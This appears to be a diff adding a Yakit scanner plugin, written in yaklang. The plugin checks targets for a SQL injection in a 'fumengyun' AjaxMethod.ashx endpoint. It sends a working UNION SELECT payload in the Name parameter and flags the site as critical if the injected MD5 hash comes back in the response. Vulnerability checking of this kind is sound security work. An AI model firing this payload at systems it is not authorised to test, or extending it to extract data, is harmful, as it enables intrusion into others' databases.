@@ -1,0 +1,60 @@
+yakit.AutoInitYakit()
+
+handleCheck = func(target,port){
+    var url
+    addr = str.HostPort(target, port)
+    isTls = str.IsTLSServer(addr)
+    level=["","low","middle","high","critical"]
+    if isTls {
+        url="https://"+addr
+    }else{
+        url="http://"+addr
+    }
+    vulnable=false
+
+    reference="fumengyun ajaxmethod name sqli 漏洞"
+    severity=level[4]
+    type="SQL注入"
+    r1 = randn(10000,20000)
+
+    poc_url_sqli= url + `/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y'+union+select+substring(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','`+ parseStr(r1) +`')),3,32)--`
+    req_sqli, _ := http.NewRequest("GET",poc_url_sqli,http.noredirect(),
+    http.header("Content-Type", `application/x-www-form-urlencoded`),)
+    breq,_=http.dump(req_sqli)
+    resp_sqli, err := http.Do(req_sqli)
+    die(err)
+    bresp,_=http.dump(resp_sqli)
+    header, body = poc.Split(bresp)
+    sqli_flag = false
+    if resp_sqli.StatusCode == 500 && str.Contains(string(body),parseStr(codec.Md5(parseStr(r1))[ 0: 32])){
+        sqli_flag = true
+    }
+
+    poc_url=poc_url_sqli
+    if sqli_flag{
+        vulnable = true
+    }
+    if vulnable {
+            yakit.Info("FOUND INFO for %v %v",reference,type)
+            risk.NewRisk(
+                url, risk.severity(severity), 
+                risk.title(sprintf("FOUND %v %v",reference,type)),
+                risk.titleVerbose(sprintf("%v %v",reference,type)),
+                risk.type(type), risk.typeVerbose(type),
+                risk.details({
+                    "request": breq,
+                    "response": bresp,
+                    "url": poc_url,
+                }),
+            )
+        }
+    return
+}
+handle = func(result) {
+    if !result.IsOpen(){
+        return
+    }
+    if len(result.Fingerprint.HttpFlows)>0{
+        handleCheck(result.Target,result.Port)
+    }
+}
